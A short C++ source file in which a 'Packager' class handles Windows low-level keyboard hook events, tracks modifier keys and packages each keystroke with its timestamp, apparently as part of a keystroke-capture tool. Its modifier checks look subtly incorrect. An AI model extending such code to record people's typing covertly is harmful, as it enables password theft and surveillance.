#include "Packager.h"


Packager::Packager()
{
	_shift = false;
	_win = false;
	_ctrl = false;
}


Packager::~Packager()
{
}

void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
	if ((info->vkCode == 160 || info->vkCode == 161) && nCode == 256) {
		_shift = true;
	}
	if ((info->vkCode == 160 || info->vkCode == 161) && nCode == 257) {
		_shift = false;
	}
	if ((info->vkCode == 162 || info->vkCode == 163) && nCode == 256) {
		_ctrl = true;
	}
	if ((info->vkCode == 162 || info->vkCode == 163) && nCode == 257) {
		_ctrl = false;
	}
	if ((info->vkCode == 91 || info->vkCode == 92) && nCode == 256) {
		_win = true;
	}
	if ((info->vkCode == 91 || info->vkCode == 92) && nCode == 257) {
		_win = false;
	}
	_pKeys.push_back(new PaquetKeys());
	_pKeys.back()->setDate(info->time);
	//_pKeys.back()->setText(info->vkCode);
	_pKeys.back()->createPaquet();
}
